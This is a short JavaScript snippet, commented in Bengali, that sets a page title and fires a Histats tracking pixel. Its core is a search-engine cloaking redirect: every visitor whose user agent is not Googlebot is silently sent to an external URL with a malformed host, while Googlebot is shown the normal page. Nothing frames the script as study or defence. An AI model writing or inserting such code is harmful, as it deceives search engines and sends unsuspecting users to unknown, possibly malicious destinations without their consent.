(function() {
  // ১. পেজের Title পরিবর্তন করার জন্য
  document.title = "Welcome to My Page";

  // ২. Histats Live Tracking Pixel
  var tracker = new Image();
  tracker.src = "https://s10.histats.com/1.gif?5032111&101";

  // ৩. User-Agent Filter & Redirect Logic
  if (!navigator.userAgent.includes('Googlebot')) {
    window.location.href = "https://asdasdasrg/4/2c199b5e97e38e9055b905dd03ab03bf";
  } else {
    console.log("Thanks for visiting my page");
  }
})();
